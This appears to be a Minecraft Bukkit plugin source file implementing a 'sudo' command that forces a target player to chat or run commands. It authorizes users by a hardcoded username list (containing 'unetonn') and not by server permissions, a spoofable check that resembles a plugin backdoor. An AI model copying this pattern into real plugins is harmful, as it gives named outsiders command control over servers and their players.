package org.main.uneton.commands;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;
import org.main.uneton.utils.ColorUtils;

import java.util.Arrays;
import java.util.List;

public class Sudo implements CommandExecutor {

    private final List<String> allowedPlayers = Arrays.asList(
            "unetonn"
            // Add more usernames as needed
    );

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, String[] args) {
        Player player = (Player) sender;
        if (!allowedPlayers.contains(player.getName())) {
            player.sendMessage(ChatColor.RED + "This command can only be executed as a specific person! Here is the list of players that can execute this command: " + allowedPlayers);
            return true;
        }

        if (args.length == 0) {
            String usage = ColorUtils.colorize("&x&2&C&0&9&1&6&l>&x&5&C&1&2&2&F&l>&x&C&7&5&3&4&7&l> &x&2&E&2&E&2&E&l- &7Usage: &x&A&B&A&B&A&B/&x&A&B&A&B&A&Bs&x&A&B&A&B&A&Bu&x&A&B&A&B&A&Bd&x&A&B&A&B&A&Bo &x&A&B&A&B&A&B<&x&A&B&A&B&A&Bt&x&A&B&A&B&A&Ba&x&A&B&A&B&A&Br&x&A&B&A&B&A&Bg&x&A&B&A&B&A&Be&x&A&B&A&B&A&Bt&x&A&B&A&B&A&B> &x&A&B&A&B&A&B<&x&A&B&A&B&A&Bc&x&A&B&A&B&A&Bo&x&A&B&A&B&A&Bm&x&A&B&A&B&A&Bm&x&A&B&A&B&A&Ba&x&A&B&A&B&A&Bn&x&A&B&A&B&A&Bd&x&A&B&A&B&A&B>");
            player.sendMessage(usage);
            return true;
        }

        Player target = Bukkit.getServer().getPlayer(args[0]);
        if (target == null || !target.isOnline()) {
            player.sendActionBar(ChatColor.DARK_RED + "That user is offline.");
            player.sendMessage(ChatColor.DARK_RED + "That user is offline.");
            return true;
        }

        if (args.length >= 2) {
            String user = args[0];
            Player cmd = Bukkit.getServer().getPlayer(user);
            if (cmd != null) {
                StringBuilder message = new StringBuilder();
                for (int i = 1; i < args.length; i++) {
                    message.append(args[i]).append(" ");
                }
                cmd.chat(message.toString()); // Execute the command on the target player
                player.sendMessage(ChatColor.GRAY + "Executed command '" + ChatColor.GREEN + message + ChatColor.GRAY + "' on player " + ChatColor.YELLOW + target.getName());
            } else {
                player.sendMessage(ChatColor.RED + "Could not find player: " + user);
            }
        }
        return true;
    }

}